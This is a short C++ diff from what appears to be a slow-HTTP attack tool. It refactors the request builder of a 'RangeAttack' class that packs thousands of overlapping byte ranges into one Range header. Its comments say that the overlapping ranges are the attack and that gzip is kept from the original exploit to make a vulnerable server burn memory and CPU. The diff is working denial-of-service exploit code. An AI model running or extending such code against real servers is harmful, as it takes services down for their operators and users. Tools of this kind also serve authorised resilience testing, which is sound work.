@@ -4,6 +4,8 @@
 
 #include <cstddef>
 
+#include "slowhttp/request.hpp"
+
 namespace slowhttp {
 
 int build_range_header(int start, int limit, std::string* out) {
@@ -51,14 +53,10 @@ Action RangeAttack::on_readable(ConnId /*id*/, const char* /*data*/,
 std::string RangeAttack::build_request() {
   std::string req;
   req.reserve(static_cast<std::size_t>(cfg_.range_limit) * 12 + 256);
-  req += cfg_.effective_verb();
-  req += ' ';
-  req += cfg_.request_target();
-  req += " HTTP/1.1\r\n";
-  req += "Host: " + cfg_.target.host_header() + "\r\n";
-  req += "User-Agent: " + cfg_.user_agent + "\r\n";
-  req += "Accept: " + cfg_.accept + "\r\n";
-  req += cfg_.caller_headers();
+  req += RequestSpec::from(cfg_).serialize_http11();
+  // The overlapping ranges are the attack. Built straight into the buffer
+  // rather than through RequestSpec::set(), because this is one header whose
+  // value is thousands of ranges long and is counted as it is written.
   range_count_ = build_range_header(cfg_.range_start, cfg_.range_limit, &req);
   // gzip is part of the original exploit: compressing each overlapping range
   // separately is where a vulnerable server burns memory and CPU.
